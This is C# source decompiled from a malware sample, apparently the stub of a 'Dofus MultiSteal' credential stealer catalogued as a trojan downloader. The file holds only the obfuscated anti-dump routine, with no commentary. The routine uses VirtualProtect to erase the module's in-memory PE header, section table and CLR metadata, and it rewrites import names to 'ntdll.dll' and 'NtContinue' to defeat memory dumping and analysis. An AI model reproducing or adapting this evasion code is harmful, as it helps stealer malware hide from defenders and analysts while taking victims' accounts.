// Decompiled with JetBrains decompiler
// Type: ⽕㮛㮫橸؉봯泌地
// Assembly: Dofus MultiSteal 2 Stub, Version=2.4.7.1, Culture=neutral, PublicKeyToken=null
// MVID: 4A6C63D2-6A40-4E78-BD3A-6EEDEF9C0E02
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Downloader.Win32.Dapato.kte-11f5a580d24c3760de824f37d3ab6d1c0a96a6b740701b059583fb37bf8a106c.exe

using System;
using System.Runtime.InteropServices;

internal static class \u2F55㮛㮫橸\u0609봯泌地
{
  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect", PreserveSig = false)]
  private static extern unsafe bool 鈙茑뻁̑냄\uE52D鎧墣(
    byte* lpAddress,
    int dwSize,
    uint flNewProtect,
    out uint lpflOldProtect);

  public static unsafe void 筕紥ᔻ훲\u2734鷲畛쫧()
  {
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(typeof (\u2F55㮛㮫橸\u0609봯泌地).Module);
    byte* numPtr1 = hinstance + 60;
    byte* numPtr2 = hinstance + (int) *(uint*) numPtr1 + 6;
    ushort length = *(ushort*) numPtr2;
    byte* numPtr3 = numPtr2 + 14;
    ushort num1 = *(ushort*) numPtr3;
    byte* numPtr4 = numPtr3 + 4 + (int) num1;
    // ISSUE: untyped stack allocation
    byte* numPtr5 = (byte*) __untypedstackalloc(new IntPtr(11));
    *(int*) numPtr5 = 1818522734;
    *(int*) (numPtr5 + 4) = 1818504812;
    *(short*) (numPtr5 + 8) = (short) 108;
    numPtr5[10] = (byte) 0;
    // ISSUE: untyped stack allocation
    byte* numPtr6 = (byte*) __untypedstackalloc(new IntPtr(11));
    *(int*) numPtr6 = 1866691662;
    *(int*) (numPtr6 + 4) = 1852404846;
    *(short*) (numPtr6 + 8) = (short) 25973;
    numPtr6[10] = (byte) 0;
    if (!(typeof (\u2F55㮛㮫橸\u0609봯泌地).Module.FullyQualifiedName != "<Unknown>"))
    {
      uint lpflOldProtect;
      \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(numPtr4 - 16, 8, 64U, out lpflOldProtect);
      *(int*) (numPtr4 - 12) = 0;
      uint num2 = *(uint*) (numPtr4 - 16);
      *(int*) (numPtr4 - 16) = 0;
      uint num3 = *(uint*) (numPtr4 - 120);
      uint[] numArray1 = new uint[(int) length];
      uint[] numArray2 = new uint[(int) length];
      uint[] numArray3 = new uint[(int) length];
      for (int index = 0; index < (int) length; index++)
      {
        \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(numPtr4, 8, 64U, out lpflOldProtect);
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) numPtr4, 8);
        numArray1[index] = *(uint*) (numPtr4 + 12);
        numArray2[index] = *(uint*) (numPtr4 + 8);
        numArray3[index] = *(uint*) (numPtr4 + 20);
        numPtr4 += 40;
      }
      if (num3 != 0U)
      {
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray1[index] < num3 && num3 < numArray1[index] + numArray2[index])
          {
            num3 = num3 - numArray1[index] + numArray3[index];
            break;
          }
        }
        byte* numPtr7 = hinstance + (int) num3;
        uint num4 = *(uint*) numPtr7;
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray1[index] < num4 && num4 < numArray1[index] + numArray2[index])
          {
            num4 = num4 - numArray1[index] + numArray3[index];
            break;
          }
        }
        byte* numPtr8 = hinstance + (int) num4;
        uint num5 = *(uint*) (numPtr7 + 12);
        for (int index = 0; index < (int) length; index++)
        {
          if (numArray1[index] < num5 && num5 < numArray1[index] + numArray2[index])
          {
            num5 = num5 - numArray1[index] + numArray3[index];
            break;
          }
        }
        uint num6 = *(uint*) numPtr8 + 2U;
        for (int index = 0; index < (int) length; index++)
        {
          if (numArray1[index] < num6 && num6 < numArray1[index] + numArray2[index])
          {
            num6 = num6 - numArray1[index] + numArray3[index];
            break;
          }
        }
        \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(hinstance + (int) num5, 11, 64U, out lpflOldProtect);
        for (int index = 0; index < 11; index++)
          (hinstance + (int) num5)[index] = numPtr5[index];
        \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(hinstance + (int) num6, 11, 64U, out lpflOldProtect);
        for (int index = 0; index < 11; ++index)
          (hinstance + (int) num6)[index] = numPtr6[index];
      }
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray1[index] < num2 && num2 < numArray1[index] + numArray2[index])
        {
          num2 = num2 - numArray1[index] + numArray3[index];
          break;
        }
      }
      byte* lpAddress1 = hinstance + (int) num2;
      \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(lpAddress1, 72, 64U, out lpflOldProtect);
      uint num7 = *(uint*) (lpAddress1 + 8);
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray1[index] < num7 && num7 < numArray1[index] + numArray2[index])
        {
          num7 = num7 - numArray1[index] + numArray3[index];
          break;
        }
      }
      *(int*) lpAddress1 = 0;
      *(int*) (lpAddress1 + 4) = 0;
      *(int*) (lpAddress1 + 8) = 0;
      *(int*) (lpAddress1 + 12) = 0;
      byte* lpAddress2 = hinstance + (int) num7;
      \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(lpAddress2, 4, 64U, out lpflOldProtect);
      *(int*) lpAddress2 = 0;
      byte* numPtr9 = lpAddress2 + 12;
      byte* numPtr10 = (byte*) ((ulong) ((uint) (numPtr9 + (int) *(uint*) numPtr9) + 7U) & 18446744073709551612UL) + 2;
      ushort num8 = (ushort) *numPtr10;
      byte* lpAddress3 = numPtr10 + 2;
      for (int index1 = 0; index1 < (int) num8; ++index1)
      {
        \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(lpAddress3, 8, 64U, out lpflOldProtect);
        *(int*) lpAddress3 = 0;
        byte* numPtr11 = lpAddress3 + 4;
        *(int*) numPtr11 = 0;
        lpAddress3 = numPtr11 + 4;
        for (int index2 = 0; index2 < 8; ++index2)
        {
          \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(lpAddress3, 4, 64U, out lpflOldProtect);
          *lpAddress3 = (byte) 0;
          byte* numPtr12 = lpAddress3 + 1;
          if (*numPtr12 == (byte) 0)
          {
            lpAddress3 = numPtr12 + 3;
            break;
          }
          *numPtr12 = (byte) 0;
          byte* numPtr13 = numPtr12 + 1;
          if (*numPtr13 == (byte) 0)
          {
            lpAddress3 = numPtr13 + 2;
            break;
          }
          *numPtr13 = (byte) 0;
          byte* numPtr14 = numPtr13 + 1;
          if (*numPtr14 != (byte) 0)
          {
            *numPtr14 = (byte) 0;
            lpAddress3 = numPtr14 + 1;
          }
          else
          {
            lpAddress3 = numPtr14 + 1;
            break;
          }
        }
      }
    }
    else
    {
      uint lpflOldProtect;
      \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(numPtr4 - 16, 8, 64U, out lpflOldProtect);
      *(int*) (numPtr4 - 12) = 0;
      byte* lpAddress4 = hinstance + (int) *(uint*) (numPtr4 - 16);
      *(int*) (numPtr4 - 16) = 0;
      if (*(uint*) (numPtr4 - 120) != 0U)
        goto label_76;
label_58:
      for (int index = 0; index < (int) length; ++index)
      {
        \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(numPtr4, 8, 64U, out lpflOldProtect);
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) numPtr4, 8);
        numPtr4 += 40;
      }
      \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(lpAddress4, 72, 64U, out lpflOldProtect);
      byte* lpAddress5 = hinstance + (int) *(uint*) (lpAddress4 + 8);
      *(int*) lpAddress4 = 0;
      *(int*) (lpAddress4 + 4) = 0;
      *(int*) (lpAddress4 + 8) = 0;
      *(int*) (lpAddress4 + 12) = 0;
      \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(lpAddress5, 4, 64U, out lpflOldProtect);
      *(int*) lpAddress5 = 0;
      byte* numPtr15 = lpAddress5 + 12;
      byte* numPtr16 = (byte*) ((ulong) ((uint) (numPtr15 + (int) *(uint*) numPtr15) + 7U) & 18446744073709551612UL) + 2;
      ushort num9 = (ushort) *numPtr16;
      byte* lpAddress6 = numPtr16 + 2;
      for (int index3 = 0; index3 < (int) num9; index3++)
      {
        \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(lpAddress6, 8, 64U, out lpflOldProtect);
        *(int*) lpAddress6 = 0;
        byte* numPtr17 = lpAddress6 + 4;
        *(int*) numPtr17 = 0;
        lpAddress6 = numPtr17 + 4;
        for (int index4 = 0; index4 < 8; ++index4)
        {
          \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(lpAddress6, 4, 64U, out lpflOldProtect);
          *lpAddress6 = (byte) 0;
          byte* numPtr18 = lpAddress6 + 1;
          if (*numPtr18 == (byte) 0)
          {
            lpAddress6 = numPtr18 + 3;
            break;
          }
          *numPtr18 = (byte) 0;
          byte* numPtr19 = numPtr18 + 1;
          if (*numPtr19 != (byte) 0)
          {
            *numPtr19 = (byte) 0;
            byte* numPtr20 = numPtr19 + 1;
            if (*numPtr20 == (byte) 0)
            {
              lpAddress6 = numPtr20 + 1;
              break;
            }
            *numPtr20 = (byte) 0;
            lpAddress6 = numPtr20 + 1;
          }
          else
          {
            lpAddress6 = numPtr19 + 2;
            break;
          }
        }
      }
      return;
label_76:
      byte* numPtr21 = hinstance + (int) *(uint*) (numPtr4 - 120);
      byte* numPtr22 = hinstance + (int) *(uint*) numPtr21;
      byte* lpAddress7 = hinstance + (int) *(uint*) (numPtr21 + 12);
      byte* lpAddress8 = hinstance + (int) *(uint*) numPtr22 + 2;
      \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(lpAddress7, 11, 64U, out lpflOldProtect);
      for (int index = 0; index < 11; ++index)
        lpAddress7[index] = numPtr5[index];
      \u2F55㮛㮫橸\u0609봯泌地.鈙茑뻁̑냄\uE52D鎧墣(lpAddress8, 11, 64U, out lpflOldProtect);
      for (int index = 0; index < 11; index++)
        lpAddress8[index] = numPtr6[index];
      goto label_58;
    }
  }
}
